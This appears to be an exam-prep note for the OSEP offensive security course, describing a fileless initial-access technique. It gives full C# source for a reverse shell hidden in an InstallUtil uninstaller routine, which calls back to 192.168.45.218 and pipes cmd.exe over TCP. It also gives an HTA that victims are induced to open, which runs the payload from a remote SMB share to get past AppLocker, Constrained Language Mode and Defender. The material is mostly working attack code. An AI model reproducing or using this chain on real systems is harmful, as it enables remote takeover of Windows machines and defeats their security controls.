# OSEP-Notes


## HTA Fileless Initial Access Reverse Shell (AppLocker + CLM + Defender Bypass) 

Scenario: You can make a user execute your malicious HTA files, but AppLocker, CLM, and Defender block all payloads.

To get a fileless reverse shell, one method that worked for me is via LOLBIN InstallUtil.

In attacker dev machine, write the following code to temp.cs:

```csharp
using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Linq;
using System.Text;


namespace Exec
{
	public class Program
	{

		public static void Main()
		{
			Console.WriteLine("Hello From Main :p");

		}
	}
	
	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}
		static StreamWriter streamWriter;
		public override void Uninstall(System.Collections.IDictionary savedState) {
			using (TcpClient client = new TcpClient("192.168.45.218", 8085))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while (true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}
	}
		

}
```

Compile it with csc
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe .\temp.cs
```

Now, we can simply make the victim user execute the following hta:
```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe /c \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U \\\\192.168.45.218\\pwn\\temp.exe\"");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```
